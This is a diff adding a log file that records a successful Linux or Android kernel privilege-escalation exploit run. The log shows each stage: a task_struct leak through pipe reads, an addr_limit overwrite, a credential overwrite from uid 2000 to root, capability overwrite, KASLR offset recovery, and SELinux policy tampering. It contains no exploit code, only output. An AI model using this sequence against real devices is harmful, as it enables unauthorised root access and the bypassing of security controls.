@@ -1,0 +1,49 @@
+[>] Leak task_struct
+[+] Starting to write 0x1000 bytes in iov_pipe
+[+] Wrote 73728 bytes with writev in pipe
+[>] Leak task_struct
+	[+] Process is triggering unlink
+	[+] Process read 65537 bytes from iov_pipe
+	[+] Child process exiting
+[+] Read 4095 bytes from iov_pipe
+[+] thread is at: 0xffffffee09ebe400
+[+] @waitqueue: 0xffffffee09ebe4a8
+[+] @task_struct=0xffffffed95363300
+[>] Read stack address
+	[+] Process is triggering unlink
+	[+] @thread_addr=ffffffee09ebe400
+[+] Read 4095 bytes from iov_pipe
+[+] thread is at: 0xffffffee09ebe400
+[+] @waitqueue: 0xffffffee09ebe4a8
+[+] @task_struct=0xffffffed95363300
+[>] Read stack address
+	[+] Process read 4096 bytes from iov_pipe
+	[+] Child process exiting
+[+] @stack=ffffffed95014000
+[>] Read thread_info address
+[+] @thread_info=ffffffed95014000
+[>] Read addr_limit address
+	[+] Process is triggering unlink
+	[+] @thread_addr=ffffffee09ebe400
+[+] @stack=ffffffed95014000
+[>] Read thread_info address
+[+] @thread_info=ffffffed95014000
+[>] Read addr_limit address
+	[+] Process read 4096 bytes from iov_pipe
+	[+] Child process exiting
+[+] @addr_limit=0xffffffed95014008, addr_limit=8000000000
+[>] Overwrite addr_limit with 0xfffffffffffffffe
+[-] Can't open '/sys/fs/selinux/policy':  Permission denied
+[-] Could not load policy
+[+] struct_cred is at: 0xffffffed83a0d300
+[+] uid=2000, gid=2000
+[+] struct_cred has been overwritten
+[+] uid=0, gid=0
+[+] capabilities are overwritten !
+[+] SECCOMP is already disabled !
+[+] Kaslr offset is: 403c30000
+[+] @avc_cache=ffffff840dec4c40
+[+] SID=866
+libsepol.policydb_index_others: security:  1 users, 4 roles, 2209 types, 0 bools
+libsepol.policydb_index_others: security: 1 sens, 1024 cats
+libsepol.policydb_index_others: security:  91 classes, 25985 rules, 0 cond rules
